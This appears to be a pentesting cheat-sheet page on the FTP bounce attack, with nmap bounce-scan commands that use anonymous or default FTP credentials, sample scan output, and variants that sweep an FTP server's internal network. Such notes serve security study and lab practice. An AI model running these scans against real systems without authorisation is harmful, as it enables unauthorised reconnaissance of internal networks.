# FTP Bounce Attack

* a network attack that uses FTP servers to deliver outbound traffic to another device on the network.
  * The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server



<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

### Attack

* [nmap.md](nmap.md "mention")

```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

```shell-session
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

```
nmap -b <name>:<pass>@<ftp_server> <victim>
```

```
nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTP
```

```
nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80,443
```

## Reference

* https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp/ftp-bounce-attack
